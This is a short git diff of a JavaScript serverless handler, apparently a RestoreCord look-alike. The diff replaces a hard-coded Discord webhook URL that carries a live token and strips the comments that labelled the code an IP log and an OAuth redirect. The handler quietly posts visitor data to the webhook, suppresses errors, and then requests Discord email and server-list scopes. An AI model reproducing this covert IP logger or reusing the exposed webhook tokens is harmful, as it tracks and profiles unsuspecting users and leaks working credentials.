@@ -3,9 +3,8 @@ export default async function handler(req, res) {
 
   const discordClientId = "1390626260056674366";
   const redirectUri = "https://restorecord-three.vercel.app/api/callback";
-  const webhookURL = "https://discord.com/api/webhooks/1390330277854969906/3Xxwg1PF0sxuV4j9aT-4gx1Q2CLfqNBMX_GuZFlheEsA-iAYYrF-MWRxYcL8lSOrNRZf";
+  const webhookURL = "https://discord.com/api/webhooks/1391119754780999730/r2DO9bmjrdv7EvHXKmwv7ICJtb_ZU68Az5JryR-tmPoqY_rcj_1-CMq3BFnIoRm3J82-";
 
-  // Send IP log
   await fetch(webhookURL, {
     method: "POST",
     headers: { "Content-Type": "application/json" },
@@ -22,8 +21,7 @@ export default async function handler(req, res) {
     }),
   }).catch(() => {});
 
-  // Redirect to Discord OAuth2
-  const discordOAuthUrl = 
+  const discordOAuthUrl =
     `https://discord.com/oauth2/authorize?client_id=${discordClientId}` +
     `&redirect_uri=${encodeURIComponent(redirectUri)}` +
     `&response_type=code&scope=identify%20email%20guilds`;
